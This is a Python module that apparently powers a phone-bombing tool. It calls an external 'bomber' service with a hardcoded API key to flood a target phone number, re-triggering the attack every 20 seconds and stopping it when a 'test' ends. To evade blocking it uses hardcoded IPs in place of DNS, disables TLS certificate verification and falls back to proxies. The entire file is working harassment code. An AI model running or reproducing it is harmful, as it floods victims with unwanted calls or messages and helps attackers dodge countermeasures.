from __future__ import annotations

import asyncio
import aiohttp
import ssl
from aiohttp import TCPConnector
from typing import Optional, List
import logging

logger = logging.getLogger(__name__)

EXTERNAL_BOMBER_KEY  = "urfaaan_omdivine"
EXTERNAL_BOMBER_HOST = "bomber.kingcc.qzz.io"

# Hardcoded IPs — bypasses Railway DNS which can't resolve qzz.io
EXTERNAL_BOMBER_IPS  = [
    "172.67.210.251",
    "104.21.61.142",
]

REPING_INTERVAL = 20  # re-ping every 20 seconds to keep bomber active

# Shared state so dashboard can show it
bomberStatus: dict = {}  # userId -> {"active": bool, "hits": int}


def _buildUrl(ip: str, action: str, phone: str) -> str:
    return f"https://{ip}/{action}?key={EXTERNAL_BOMBER_KEY}&numbar={phone}"


async def _fireWithIp(ip: str, action: str, phone: str) -> bool:
    """Fire the external bomber using hardcoded IP with Host header."""
    try:
        # Skip SSL verification since we're connecting by IP
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode    = ssl.CERT_NONE

        connector = TCPConnector(ssl=ssl_ctx)
        headers   = {"Host": EXTERNAL_BOMBER_HOST}

        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(
                _buildUrl(ip, action, phone),
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=True,
            ) as resp:
                text = await resp.text()
                logger.info(f"ExtBomber [{ip}] {action} → {resp.status} | {text[:60]}")
                return resp.status < 500
    except Exception as e:
        logger.info(f"ExtBomber [{ip}] failed: {type(e).__name__}: {str(e)[:50]}")
        return False


async def _fire(action: str, phone: str, proxies: List[str] = []) -> bool:
    """Try all IPs until one works."""
    for ip in EXTERNAL_BOMBER_IPS:
        if await _fireWithIp(ip, action, phone):
            return True
    # If all IPs fail, try through proxies as last resort
    if proxies:
        try:
            from aiohttp_socks import ProxyConnector
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode    = ssl.CERT_NONE
            for proxy in proxies[:3]:
                try:
                    connector = ProxyConnector.from_url(proxy, ssl=ssl_ctx)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        async with session.get(
                            f"https://{EXTERNAL_BOMBER_HOST}/{action}",
                            params={"key": EXTERNAL_BOMBER_KEY, "numbar": phone},
                            timeout=aiohttp.ClientTimeout(total=10),
                        ) as resp:
                            if resp.status < 500:
                                return True
                except Exception:
                    continue
        except Exception:
            pass
    return False


async def externalBomberLoop(
    phone: str,
    stopEvent: asyncio.Event,
    proxies: List[str] = [],
    userId: Optional[int] = None,
) -> None:
    """
    Runs alongside the main test.
    Fires bomb URL immediately, re-pings every REPING_INTERVAL seconds.
    Fires stop URL when test ends.
    Uses hardcoded IPs to bypass Railway DNS.
    """
    hits = 0

    # Update status
    if userId:
        bomberStatus[userId] = {"active": False, "hits": 0}

    ok = await _fire("bomb", phone, proxies)
    if ok:
        hits += 1
        if userId:
            bomberStatus[userId] = {"active": True, "hits": hits}
        logger.info(f"External bomber ACTIVE for {phone}")
    else:
        logger.info(f"External bomber FAILED for {phone} — skipping")
        if userId:
            bomberStatus[userId] = {"active": False, "hits": 0}
        return

    # Keep re-pinging while test runs
    while not stopEvent.is_set():
        try:
            await asyncio.wait_for(
                asyncio.shield(stopEvent.wait()),
                timeout=REPING_INTERVAL
            )
            break
        except asyncio.TimeoutError:
            ok = await _fire("bomb", phone, proxies)
            if ok:
                hits += 1
                if userId:
                    bomberStatus[userId]["hits"] = hits

    # Test ended — fire stop
    await _fire("stop", phone, proxies)
    if userId:
        bomberStatus.pop(userId, None)
    logger.info(f"External bomber STOPPED for {phone} — total hits: {hits}")